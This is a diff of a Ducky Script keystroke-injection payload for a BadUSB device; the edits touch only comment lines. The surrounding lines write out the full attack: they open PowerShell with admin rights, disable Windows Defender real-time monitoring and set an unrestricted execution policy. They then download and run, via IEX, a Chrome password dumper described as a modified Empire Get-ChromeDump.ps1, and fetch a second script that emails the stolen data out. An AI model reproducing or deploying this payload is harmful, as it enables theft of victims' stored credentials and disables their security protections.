@@ -20,7 +20,7 @@ ENTER
 DELAY 1000
 STRING powershell
 ENTER
-REM ** runing powershell through cmd with admin privlages, turn off windows defender, and set powerscript execution policy **
+REM *** runing powershell through cmd with admin privlages, turn off windows defender, and set powerscript execution policy ***
 DELAY 300
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
@@ -28,11 +28,11 @@ DELAY 1500
 STRING set-executionpolicy unrestricted
 ENTER
 DELAY 500
-REM  ** dump passwords using a modified version of "xxx" **
+REM  *** dump passwords using a modified version of Empire Project's Get-ChromeDump.ps1 ***
 STRING IEX (New-Object Net.WebClient).DownloadString('Location of chrome dump .ps1')
 ENTER
 DELAY 5000
-REM  ** time to send an email **
+REM  *** time to send an email everything in C:\l ***
 STRING IEX (New-Object Net.WebClient).DownloadString('location of email .ps1')
 ENTER
 DELAY 2000
